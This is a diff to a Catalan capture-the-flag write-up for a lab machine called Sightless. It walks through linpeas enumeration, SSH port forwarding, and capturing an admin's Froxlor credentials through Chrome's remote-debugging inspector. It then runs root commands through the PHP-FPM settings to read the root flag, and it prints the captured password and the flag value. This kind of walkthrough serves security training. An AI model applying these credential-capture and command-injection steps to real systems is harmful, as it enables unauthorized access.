@@ -383,4 +383,145 @@ Un cop estem amb el Chrome, hem de posar al navegador com si fos una URL el seg�
 
 ![[Pasted image 20241113214239.png]]
 
-Marquem la casella de Enable port forwarding ara. Ara mirem si algun dels ports reenviats és el Froxlor:
+Marquem la casella de Enable port forwarding ara. 
+
+------------------------------------------------------------
+
+Al complicar-se'm la cosa i no poder aconseguir el que sembla que havia de funcionar, he tornat a connectar-me per ssh amb l'usuari michael, i he vist que al seu home hi ha linpeas.sh, per tant l'executem i a veure is trobem alguna cosa que ens pugui ser útil per fer l'escalació de privilegis:
+
+Un cop llençat, he vist una cosa que sembla que pot ser interessant, a veure si ara sí que ens en sortim i podem escalar privilegis. Després de força estona d'analitzar el que pot ser interessant del que ha trobat Linpeas per escalar privilegis, veig això:
+
+````
+                      ╔════════════════════════════════════╗
+══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                             
+                      ╚════════════════════════════════════╝                                                   
+╔══════════╣ SUID - Check easy privesc, exploits and write perms
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                               
+strings Not Found                                                                                              
+-rwsr-xr-x 1 root root 208K May 14  2024 /opt/google/chrome/chrome-sandbox                                     
+-rwsr-xr-x 1 root root 47K Apr  9  2024 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                                                                   
+-rwsr-xr-x 1 root root 44K Feb  6  2024 /usr/bin/chsh
+-rwsr-xr-x 1 root root 227K Apr  3  2023 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
+-rwsr-xr-x 1 root root 55K Apr  9  2024 /usr/bin/su
+-rwsr-xr-x 1 root root 71K Feb  6  2024 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 35K Mar 23  2022 /usr/bin/fusermount3
+-rwsr-xr-x 1 root root 72K Feb  6  2024 /usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-xr-x 1 root root 40K Feb  6  2024 /usr/bin/newgrp  --->  HP-UX_10.20
+-rwsr-xr-x 1 root root 59K Feb  6  2024 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                        
+-rwsr-xr-x 1 root root 35K Apr  9  2024 /usr/bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-x 1 root root 19K Feb 26  2022 /usr/libexec/polkit-agent-helper-1
+-rwsr-xr-x 1 root root 331K Jun 26 13:11 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-- 1 root messagebus 35K Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+
+````
+
+
+On, si ens hi fixem, això podria ser molt interessant:
+
+``-rwsr-xr-x 1 root root 227K Apr  3  2023 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable``
+
+Però la versió de sudo no és vulnerable.
+
+No hi ha hagut èxit, i tampoc amb altres coses que he anat trobant per Linpeas. Tornaré a provar la tècnica del port forwarding a veure si hi ha més sort ara. Primer de tot miro els ports de la màquina on hi ha l'usuari michael com havíem dit abans:
+
+```
+michael@sightless:~$ netstat -tpln
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:43423         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:35155         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:44311         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:6969            0.0.0.0:*               LISTEN      71457/python3       
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 :::21                   :::*                    LISTEN      -                   
+michael@sightless:~$
+``` 
+
+
+Ara, de tots aquests ports farem port forwarding cap a la meva màquina com ja havia provat anteriorment, un per un, mantenint la connexió ssh que fa el port forwarding oberta, és a dir mantenint la shell oberta d'en michael, un exemple ja que s'ha de fer amb cada un dels ports:
+
+
+```
+┌──(kali㉿kali)-[~]
+└─$ ssh -L 43423:127.0.0.1:43423 michael@10.10.11.32
+michael@10.10.11.32's password: 
+Last login: Sat Nov 16 20:25:48 2024 from 10.10.15.8
+michael@sightless:~$ 
+```
+
+I aquests són tots els ports amb els quals he hagut d'anar fent forwarding un per un i mantenint les consoles obertes:
+
+```
+ssh -L 35155:127.0.0.1:35155 michael@10.10.11.32
+ssh -L 33060:127.0.0.1:33060 michael@10.10.11.32
+ssh -L 3000:127.0.0.1:3000 michael@10.10.11.32
+ssh -L 3306:127.0.0.1:3306 michael@10.10.11.32
+ssh -L 44311:127.0.0.1:44311 michael@10.10.11.32
+ssh -L 53:127.0.0.53:53 michael@10.10.11.32
+ssh -L 8080:127.0.0.1:8080 michael@10.10.11.32
+ssh -L 6969:0.0.0.0:6969 michael@10.10.11.32
+```
+
+Ara, un cop tenim el port forwarding activat obrim Google Chrome i anem a: ``chrome://inspect/#devices``
+
+I aquí fem clic a “Configure” i afegim els ports que hem reenviat com a 127.0.0.1:port. Hem de repetir aquest pas per cada un dels ports que hem redirigit. Un cop afegits els port, veiem una connexió sota "Remote Targets". Fem clic a "Inspect" per obrir una nova finestra del navegador que ens permetrà veure el tràfic de la pàgina web.
+
+![[Pasted image 20241117092534.png]]
+
+![[Pasted image 20241117092549.png]]
+
+I ara veiem com en michael inicia sessió amb l'usuari admin i fa login i podem capturar les seves credencials gràcies al port forwarding:
+
+![[Pasted image 20241117092607.png]]
+
+
+D'aquesta manera hem obtingut les credencials i ja podem entrar al dashboard de Froxlor com a usuaris administradors:
+
+admin
+ForlorfroxAdmin
+
+![[Pasted image 20241117092626.png]]
+
+Ara, anem a PHP -> PHP-FPM versions,on  veiem que podem carregar comandes i executar-les directament al sistema, és el mètode que utilitzarem per poder obtenir la root flag. Per fer això, utilitzarem la comanda `cp /root/root.txt /tmp/root.txt` per copiar la flag al directori /tmp per iniciar sessió com root per ssh i guardem amb Save:
+
+![[Pasted image 20241117092712.png]]
+
+Ara deshabilitarem i habilitarem el PHP-FPM per poder executar la comanda des de System>Settings>PHP-FPM:
+
+![[Pasted image 20241117092729.png]]
+
+![[Pasted image 20241117092739.png]]
+
+![[Pasted image 20241117092749.png]]
+
+I ara tornarem a fer el mateix donant permisos de lectura al fitxer /tmp/root.txt amb la comanda chmod 644 que fa que el propietari del fitxer pugui llegir i escriure al fitxer i el grup i altres usuaris només poden llegir el fitxer, però no modificar-lo. `chmod 644 /tmp/root.txt`:
+
+![[Pasted image 20241117092806.png]]
+
+I ara entrem per ssh amb l'usuari michael i anem al fitxer /tmp/root.txt per poder llegir la root flag:
+
+```
+┌──(kali㉿kali)-[~]
+└─$ ssh michael@10.10.11.32                           
+michael@10.10.11.32's password: 
+Last login: Sat Nov 16 21:19:04 2024 from 10.10.15.8
+michael@sightless:~$ cat /tmp/root.txt 
+1bbbadb909796bd37433356aa2f30951
+michael@sightless:~$ 
+```
+
+I ja hem completat la màquina:
+
+![[Pasted image 20241117092921.png]]
+
+
+
